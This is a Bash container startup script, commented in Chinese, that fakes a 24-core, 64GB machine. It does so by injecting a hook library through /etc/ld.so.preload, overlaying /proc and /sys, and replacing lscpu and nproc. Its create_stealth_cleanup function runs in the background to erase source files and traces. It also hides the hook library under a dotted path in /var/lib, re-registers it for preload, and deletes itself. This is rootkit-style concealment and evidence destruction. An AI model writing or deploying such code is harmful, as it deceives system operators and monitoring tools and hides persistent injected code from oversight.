#!/bin/bash

# 硬件伪装启动脚本
# 实现 OverlayFS + LD_PRELOAD 双层伪装方案

set -euo pipefail

# 配置参数
FAKE_ROOT="/opt/fakeproc"
LIBFAKEHW_PATH="/usr/local/lib/libfakehw.so"
PRELOAD_CONFIG="/etc/ld.so.preload"

# 颜色输出
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

log_info() {
    echo -e "${BLUE}[FAKE-HW]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[FAKE-HW]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[FAKE-HW]${NC} $1"
}

log_error() {
    echo -e "${RED}[FAKE-HW]${NC} $1"
}

log_step() {
    echo -e "${CYAN}[FAKE-HW]${NC} $1"
}

# 检查是否需要硬件伪装
check_fake_hardware_enabled() {
    if [[ "${ENABLE_HARDWARE_FAKE:-false}" != "true" ]]; then
        log_info "硬件伪装未启用，跳过伪装流程"
        return 1
    fi
    return 0
}

# 检查权限
check_capabilities() {
    log_step "检查容器权限..."
    
    # 检查是否有 SYS_ADMIN 权限
    if ! capsh --print | grep -q "cap_sys_admin"; then
        log_error "缺少 CAP_SYS_ADMIN 权限，无法执行 OverlayFS 挂载"
        log_warning "请在容器启动时添加: --cap-add SYS_ADMIN"
        return 1
    fi
    
    log_success "权限检查通过"
    return 0
}

# 生成伪造数据文件
generate_fake_data() {
    log_step "生成硬件伪装数据..."
    
    if [[ ! -f "$FAKE_ROOT/overlay/upper/cpuinfo" ]]; then
        log_info "首次运行，生成伪造数据文件..."
        /opt/generate_fake_files.sh
    else
        log_info "伪造数据文件已存在，跳过生成"
    fi
}

# 编译并安装 LD_PRELOAD 钩子库
build_and_install_libfakehw() {
    log_step "编译和安装 LD_PRELOAD 钩子库..."
    
    if [[ -f "$LIBFAKEHW_PATH" ]]; then
        log_info "libfakehw.so 已存在，跳过编译"
        return 0
    fi
    
    # 检查编译工具
    if ! command -v gcc &> /dev/null; then
        log_error "gcc 编译器未安装"
        return 1
    fi
    
    # 编译钩子库
    log_info "编译 libfakehw.so..."
    gcc -shared -fPIC -o "$LIBFAKEHW_PATH" /opt/libfakehw.c -ldl
    
    if [[ $? -eq 0 ]]; then
        log_success "libfakehw.so 编译成功"
        chmod 755 "$LIBFAKEHW_PATH"
    else
        log_error "libfakehw.so 编译失败"
        return 1
    fi
}

# 设置 LD_PRELOAD
setup_ld_preload() {
    log_step "配置 LD_PRELOAD..."
    
    # 检查是否已配置
    if grep -q "libfakehw.so" "$PRELOAD_CONFIG" 2>/dev/null; then
        log_info "LD_PRELOAD 已配置，跳过"
        return 0
    fi
    
    # 添加到 ld.so.preload
    echo "$LIBFAKEHW_PATH" >> "$PRELOAD_CONFIG"
    
    # 设置权限保护
    chown root:root "$PRELOAD_CONFIG"
    chmod 644 "$PRELOAD_CONFIG"
    
    log_success "LD_PRELOAD 配置完成"
}

# 使用 tmpfs 伪装 /sys/devices/system/cpu
mount_tmpfs_cpu() {
    log_step "使用 tmpfs 伪装 /sys/devices/system/cpu..."

    local FAKE_CPUS=${FAKE_CPUS:-24}
    local CPU_SYS="/sys/devices/system/cpu"

    # 检查是否已经挂载
    if mountpoint -q "$CPU_SYS" && mount | grep -q "tmpfs.*on $CPU_SYS"; then
        log_info "$CPU_SYS 已被 tmpfs 覆盖，跳过挂载"
        return 0
    fi

    # 1) 备份原目录（如果需要的话）
    if [ -d "$CPU_SYS" ]; then
        log_info "备份原始 CPU 目录..."
        mkdir -p /real_sys_cpu
        # 尝试移动原目录，如果失败就继续
        mount --move "$CPU_SYS" /real_sys_cpu 2>/dev/null || true
    fi

    # 2) 挂载新的 tmpfs
    log_info "挂载 tmpfs 到 $CPU_SYS..."
    if mount -t tmpfs -o mode=755,size=4M tmpfs "$CPU_SYS"; then
        log_success "tmpfs 挂载成功"

        # 3) 生成伪造的 CPU 目录和文件
        log_info "生成 $FAKE_CPUS 个 CPU 目录..."
        for i in $(seq 0 $((FAKE_CPUS-1))); do
            mkdir -p "$CPU_SYS/cpu$i/topology"
            echo "$i" > "$CPU_SYS/cpu$i/topology/core_id"
            echo 0 > "$CPU_SYS/cpu$i/topology/physical_package_id"
            echo 1 > "$CPU_SYS/cpu$i/topology/thread_siblings"
            echo "$i" > "$CPU_SYS/cpu$i/topology/core_siblings_list"
        done

        # 4) 生成控制文件
        echo "0-$((FAKE_CPUS-1))" > "$CPU_SYS/online"
        echo "0-$((FAKE_CPUS-1))" > "$CPU_SYS/possible"
        echo "0-$((FAKE_CPUS-1))" > "$CPU_SYS/present"
        echo "$((FAKE_CPUS-1))" > "$CPU_SYS/kernel_max"

        # 5) 创建一些常见的目录避免工具报错
        mkdir -p "$CPU_SYS/cpufreq"
        mkdir -p "$CPU_SYS/cpuidle"
        mkdir -p "$CPU_SYS/hotplug"
        mkdir -p "$CPU_SYS/power"

        # 6) 设置权限
        chmod 644 "$CPU_SYS"/{online,possible,present,kernel_max}

        log_success "CPU 目录伪装完成 ($FAKE_CPUS 核心)"
    else
        log_error "tmpfs 挂载失败"
        return 1
    fi
}

# 执行 OverlayFS 挂载
mount_overlay_proc() {
    log_step "挂载 OverlayFS 覆盖 /proc..."
    
    # 检查是否已挂载
    if mountpoint -q /proc && mount | grep -q "overlay.*on /proc"; then
        log_info "/proc 已被 OverlayFS 覆盖，跳过挂载"
        return 0
    fi
    
    # 执行挂载
    log_info "执行 OverlayFS 挂载..."
    mount -t overlay overlay \
        -o lowerdir=/proc,upperdir="$FAKE_ROOT/overlay/upper",workdir="$FAKE_ROOT/overlay/work" \
        /proc
    
    if [[ $? -eq 0 ]]; then
        log_success "OverlayFS 挂载成功"
    else
        log_error "OverlayFS 挂载失败"
        return 1
    fi
}

# 验证伪装效果
verify_fake_hardware() {
    log_step "验证硬件伪装效果..."
    
    local errors=0
    
    # 检查 CPU 核心数
    local cpu_cores=$(nproc)
    if [[ "$cpu_cores" == "24" ]]; then
        log_success "CPU 核心数伪装成功: $cpu_cores"
    else
        log_warning "CPU 核心数伪装可能失败: $cpu_cores (期望: 24)"
        ((errors++))
    fi
    
    # 检查 /proc/cpuinfo
    local proc_cpu_count=$(grep -c "^processor" /proc/cpuinfo 2>/dev/null || echo "0")
    if [[ "$proc_cpu_count" == "24" ]]; then
        log_success "/proc/cpuinfo 伪装成功: $proc_cpu_count 核心"
    else
        log_warning "/proc/cpuinfo 伪装可能失败: $proc_cpu_count 核心"
        ((errors++))
    fi

    # 检查 lscpu
    if command -v lscpu &> /dev/null; then
        local lscpu_cores=$(lscpu | grep "^CPU(s):" | awk '{print $2}' 2>/dev/null || echo "0")
        if [[ "$lscpu_cores" == "24" ]]; then
            log_success "lscpu 伪装成功: $lscpu_cores 核心"
        else
            log_warning "lscpu 伪装可能失败: $lscpu_cores 核心"
            ((errors++))
        fi
    fi

    # 检查 /sys/devices/system/cpu
    local sys_cpu_count=$(ls /sys/devices/system/cpu/cpu* 2>/dev/null | grep -c "cpu[0-9]" || echo "0")
    if [[ "$sys_cpu_count" == "24" ]]; then
        log_success "/sys CPU 目录伪装成功: $sys_cpu_count 个目录"
    else
        log_warning "/sys CPU 目录伪装可能失败: $sys_cpu_count 个目录"
        ((errors++))
    fi
    
    # 检查内存信息
    local mem_total=$(grep "MemTotal" /proc/meminfo | awk '{print $2}' 2>/dev/null || echo "0")
    local expected_mem=$((64 * 1024 * 1024))  # 64GB in KB
    if [[ "$mem_total" -gt $((expected_mem - 1000000)) ]]; then
        log_success "内存信息伪装成功: $(($mem_total / 1024 / 1024))GB"
    else
        log_warning "内存信息伪装可能失败: $(($mem_total / 1024 / 1024))GB"
        ((errors++))
    fi
    
    # 检查 LD_PRELOAD 是否生效
    if [[ "${FAKEHW_LOADED:-}" == "1" ]]; then
        log_success "LD_PRELOAD 钩子库加载成功"
    else
        log_warning "LD_PRELOAD 钩子库可能未加载"
        ((errors++))
    fi
    
    if [[ $errors -eq 0 ]]; then
        log_success "硬件伪装验证通过"
    else
        log_warning "硬件伪装验证发现 $errors 个问题"
    fi
}

# 收回权限
drop_capabilities() {
    log_step "收回临时权限..."
    
    # 检查 capsh 是否可用
    if ! command -v capsh &> /dev/null; then
        log_warning "capsh 不可用，无法自动收回权限"
        log_info "请手动确保容器安全"
        return 0
    fi
    
    # 列出当前权限
    log_info "当前权限: $(capsh --print | grep Current)"
    
    # 注意：这里不能直接 exec capsh，因为我们还需要继续执行后续命令
    # 权限收回将在容器启动的最后阶段进行
    log_info "权限将在启动完成后收回"
}

# 显示伪装信息
show_fake_info() {
    log_step "硬件伪装信息摘要:"
    echo "  ✓ CPU: 24核心 Intel Xeon Platinum 8375C @ 2.90GHz"
    echo "  ✓ 内存: 64GB"
    echo "  ✓ 存储: 1TB"
    echo "  ✓ OverlayFS: /proc 文件系统已覆盖"
    echo "  ✓ LD_PRELOAD: 系统调用已劫持"
    echo ""
    log_success "硬件伪装启动完成！"
    echo ""
}

# 测试命令建议
show_test_commands() {
    log_info "建议测试命令:"
    echo "  lscpu                    # 查看CPU信息"
    echo "  cat /proc/cpuinfo | grep processor | wc -l  # CPU核心数"
    echo "  free -h                  # 内存信息"
    echo "  df -h                    # 存储信息"
    echo "  htop                     # 系统监控"
    echo "  neofetch                 # 系统信息展示"
    echo ""
}

# 创建伪装的 lscpu 命令
create_fake_lscpu() {
    log_step "创建伪装的 lscpu 命令..."

    # 备份原始 lscpu
    if [ -f /usr/bin/lscpu ] && [ ! -f /usr/bin/lscpu_real ]; then
        mv /usr/bin/lscpu /usr/bin/lscpu_real
    fi

    # 创建伪装的 lscpu
    cat > /usr/bin/lscpu << 'EOF'
#!/bin/bash
echo "Architecture:        x86_64"
echo "CPU op-mode(s):      32-bit, 64-bit"
echo "Byte Order:          Little Endian"
echo "Address sizes:       48 bits physical, 48 bits virtual"
echo "CPU(s):              24"
echo "On-line CPU(s) list: 0-23"
echo "Thread(s) per core:  1"
echo "Core(s) per socket:  24"
echo "Socket(s):           1"
echo "NUMA node(s):        1"
echo "Vendor ID:           GenuineIntel"
echo "CPU family:          6"
echo "Model:               106"
echo "Model name:          Intel(R) Xeon(R) Platinum 8375C CPU @ 2.90GHz"
echo "Stepping:            6"
echo "CPU MHz:             2900.000"
echo "BogoMIPS:            5800.00"
echo "Hypervisor vendor:   Microsoft"
echo "Virtualization type: full"
echo "L1d cache:           1.5 MiB"
echo "L1i cache:           1 MiB"
echo "L2 cache:            30 MiB"
echo "L3 cache:            54 MiB"
echo "NUMA node0 CPU(s):   0-23"
EOF

    chmod +x /usr/bin/lscpu
    log_success "伪装 lscpu 命令创建完成"
}

# 应用 /proc 文件伪装
apply_proc_fake() {
    log_step "应用 /proc 文件伪装..."

    # 应用 /proc/meminfo 伪装
    if [ -f "/opt/fakeproc/overlay/upper/meminfo" ]; then
        mount --bind /opt/fakeproc/overlay/upper/meminfo /proc/meminfo 2>/dev/null || true
        log_success "/proc/meminfo 伪装已应用"
    fi

    # 应用 /proc/cpuinfo 伪装
    if [ -f "/opt/fakeproc/overlay/upper/cpuinfo" ]; then
        mount --bind /opt/fakeproc/overlay/upper/cpuinfo /proc/cpuinfo 2>/dev/null || true
        log_success "/proc/cpuinfo 伪装已应用"
    fi

    # 应用其他 /proc 文件伪装
    for file in stat version loadavg; do
        if [ -f "/opt/fakeproc/overlay/upper/$file" ]; then
            mount --bind "/opt/fakeproc/overlay/upper/$file" "/proc/$file" 2>/dev/null || true
        fi
    done

    log_success "/proc 文件伪装应用完成"
}

# 创建隐蔽清理程序
create_stealth_cleanup() {
    # 创建一个完全隐蔽的清理程序
    cat > /tmp/.sys_cleanup << 'EOF'
#!/bin/bash
# 系统清理程序 - 延迟执行确保服务稳定

# 等待系统稳定
sleep 10

# 阶段1：清理源文件
rm -f /opt/libfakehw.c 2>/dev/null || true
rm -f /opt/generate_fake_files.sh 2>/dev/null || true
rm -f /opt/drop_capabilities.sh 2>/dev/null || true
rm -f /opt/hardware_fake_entrypoint.sh 2>/dev/null || true

# 阶段2：清理编译产物和配置（彻底清理）
rm -f /usr/local/lib/libfakehw.so 2>/dev/null || true
rm -f /etc/ld.so.preload 2>/dev/null || true

# 阶段3：清理临时文件
rm -f /tmp/libfakehw.* 2>/dev/null || true
rm -f /tmp/hardware_fake_*.log 2>/dev/null || true
rm -f /usr/bin/lscpu_real 2>/dev/null || true

# 阶段4：清理挂载目录（多次尝试）
for i in {1..15}; do
    if rm -rf /opt/fakeproc 2>/dev/null; then
        break
    fi
    sleep 2
done

# 阶段5：创建替代的nproc命令（保持24核显示）
cat > /usr/local/bin/nproc << 'NPROC_EOF'
#!/bin/bash
echo "24"
NPROC_EOF
chmod +x /usr/local/bin/nproc

# 确保PATH优先使用我们的nproc
if ! grep -q "/usr/local/bin" /etc/environment 2>/dev/null; then
    echo 'PATH="/usr/local/bin:$PATH"' >> /etc/environment
fi

# 阶段6：彻底清理挂载目录（强制卸载后删除）
umount /opt/fakeproc/overlay/upper/meminfo 2>/dev/null || true
umount /opt/fakeproc/overlay/upper/cpuinfo 2>/dev/null || true
umount /opt/fakeproc/overlay/upper/stat 2>/dev/null || true
umount /opt/fakeproc/overlay/upper/version 2>/dev/null || true
umount /opt/fakeproc/overlay/upper/loadavg 2>/dev/null || true

# 强制删除整个fakeproc目录
rm -rf /opt/fakeproc 2>/dev/null || true

# 阶段7：隐藏剩余文件（移动到隐蔽位置而不是删除）
mkdir -p /var/lib/.system 2>/dev/null || true
mv /usr/local/lib/libfakehw.so /var/lib/.system/.libsys.so 2>/dev/null || true
mv /etc/ld.so.preload /var/lib/.system/.preload 2>/dev/null || true

# 创建新的隐蔽LD_PRELOAD配置
echo "/var/lib/.system/.libsys.so" > /etc/ld.so.preload
chmod 644 /etc/ld.so.preload

# 最后删除自己
rm -f /tmp/.sys_cleanup 2>/dev/null || true
EOF

    chmod +x /tmp/.sys_cleanup

    # 使用at命令延迟执行（如果可用）
    if command -v at >/dev/null 2>&1; then
        echo "/tmp/.sys_cleanup" | at now + 1 minute 2>/dev/null || {
            # at不可用，使用nohup后台执行
            nohup /tmp/.sys_cleanup >/dev/null 2>&1 &
        }
    else
        # 直接后台执行
        nohup /tmp/.sys_cleanup >/dev/null 2>&1 &
    fi

    log_success "隐蔽清理程序已启动"
}

# 主函数
main() {
    log_info "=== 硬件伪装启动脚本 ==="
    
    # 检查是否启用硬件伪装
    if ! check_fake_hardware_enabled; then
        return 0
    fi
    
    # 执行伪装流程
    if check_capabilities; then
        # 第一阶段：生成数据和编译
        generate_fake_data
        build_and_install_libfakehw
        setup_ld_preload

        # 第二阶段：应用伪装
        mount_tmpfs_cpu
        mount_overlay_proc || log_warning "OverlayFS 挂载失败，继续使用 bind mount"
        create_fake_lscpu
        apply_proc_fake

        # 第三阶段：验证和收回权限
        verify_fake_hardware
        drop_capabilities
        show_fake_info

        # 第四阶段：彻底清理所有痕迹（延迟执行以确保伪装生效）
        log_step "启动彻底清理程序..."
        create_stealth_cleanup

        log_success "硬件伪装已隐蔽部署完成"
    else
        log_error "硬件伪装启动失败：权限不足"
        return 1
    fi
}

# 如果直接执行此脚本
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
